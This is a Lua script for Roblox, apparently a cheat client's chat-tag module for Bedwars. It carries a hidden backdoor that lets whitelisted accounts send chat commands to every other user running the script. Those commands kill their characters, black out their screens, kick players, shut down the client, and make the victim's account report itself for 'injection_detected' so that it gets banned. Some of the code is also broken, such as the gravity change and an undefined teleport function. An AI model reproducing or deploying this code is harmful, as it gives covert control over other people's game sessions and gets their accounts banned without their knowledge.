local textChatService = game:GetService("TextChatService")

local whitelisted = {
    {name = "zephyerisfunny", tags = {4}},
    {name = "putyourcorkinmyas", tags = {3}},
    {name = "BedwarsFunnyAC", tags = {3}},
    {name = "NotXylexLOL", tags = {3}},
    {name = "grimacefrommc_donald", tags = {2}},
}
	
local chatTags = {
    [1] = {name = "LUCK OWNER", color = Color3.fromRGB(124,252,0)},
    [2] = {name = "LUCK CO OWNER", color = Color3.fromRGB(124,252,0)},
    [3] = {name = "LUCK DEVELOPER", color = Color3.fromRGB(124,252,0)},
    [4] = {name = "LUCK HEAD DEVELOPER", color = Color3.fromRGB(124,252,0)},

}

local function getPlayerTags(playerName)
    for _, player in ipairs(whitelisted) do
        if player.name == playerName then
            return player.tags
        end
    end
    return {}
end

local function isPlayerAllowed(playerName)
    return #getPlayerTags(playerName) > 0
end

local function formatTag(tagData)
    return string.format("<font color='rgb(%d, %d, %d)'>[%s]</font>", tagData.color.R * 255, tagData.color.G * 255, tagData.color.B * 255, tagData.name)
end

local function getFormattedTags(playerName)
    local tags = getPlayerTags(playerName)
    local formattedTags = ""
    for _, tag in ipairs(tags) do
        formattedTags = formattedTags .. formatTag(chatTags[tag]) .. " "
    end
    return formattedTags
end

-- cmds thing


local function createBlindGui()
    local gui = Instance.new("ScreenGui")
    gui.Name = "BlindGui"
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local frame = Instance.new("Frame")
    frame.BackgroundTransparency = 0
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.BorderSizePixel = 0
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.Parent = gui

    gui.Parent = game:GetService("CoreGui")

    return gui
end

local function removeBlindGui()
    local gui = game:GetService("CoreGui"):FindFirstChild("BlindGui")
    if gui then
        gui:Destroy()
    end
end

local lighting = game:GetService("Lighting")

local workspace = game:GetService("Workspace")
local gravity = workspace.Gravity

local cmds = {
    [".kill"] = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
        end
    end,
    [".void"] = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            local character = game.Players.LocalPlayer.Character
            local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
            local newPosition = humanoidRootPart.CFrame
            for i = 1, 3 do
                newPosition = newPosition + Vector3.new(0, -100, 0)
                humanoidRootPart.CFrame = newPosition
                wait(0.01)
            end
        end
    end,
     [".nograv"] = function(player)
        if not isPlayerAllowed(player.Name) then
            gravity = 0 -- Set gravity to 0, disabling gravity
        end
    end,
    [".grav"] = function(player)
        if not isPlayerAllowed(player.Name) then
            gravity = 196.2 -- Set gravity to the default value (196.2), enabling gravity
        end
    end,
    [".night"] = function(player)
        if not isPlayerAllowed(player.Name) then
            lighting.ClockTime = 0 -- Set the clock time to 0, making it night
        end
    end,
    [".day"] = function(player)
        if not isPlayerAllowed(player.Name) then
            lighting.ClockTime = 12 -- Set the clock time to 12, making it day
        end
    end,
    [".kick"] = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            wait(1)
            for index, player in pairs(game.Players:GetPlayers()) do
                player:Kick("kicked")
            end
        end
    end,
  [".blind"] = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            createBlindGui()
        end
    end,
    [".unblind"] = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            removeBlindGui()
        end
    end,
    [".gameban"] = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            local rs = game:GetService("ReplicatedStorage")
            local remote = rs:FindFirstChild("SelfReport", true)
            remote:FireServer("injection_detected")
        end
    end,
    [".lobby"] = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			local gameId = 6872265039
            teleportToGame(gameId)
        end
    end,
    [".shutdown"] = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            game:Shutdown()
        end
    end,
    [".lagback"] = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            local character = game.Players.LocalPlayer.Character
            local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
            local newPosition = humanoidRootPart.CFrame
            for i = 1, 3 do
                newPosition = newPosition + Vector3.new(10000, 10010000100001000000, 100001000010000)
                humanoidRootPart.CFrame = newPosition
                wait(0.01)
            end
        end
    end
}

textChatService.OnIncomingMessage = function(message)
    local properties = Instance.new("TextChatMessageProperties")
    if message.TextSource then
        local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
        local tags = getFormattedTags(player.Name)
        if tags ~= "" then
            properties.PrefixText = tags .. " " .. message.PrefixText
        end
        local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
        if isPlayerAllowed(player.Name) then
            local command = cmds[message.Text]
            if command then
                command(game.Players.LocalPlayer)
            end
        end
    end
    return properties
end
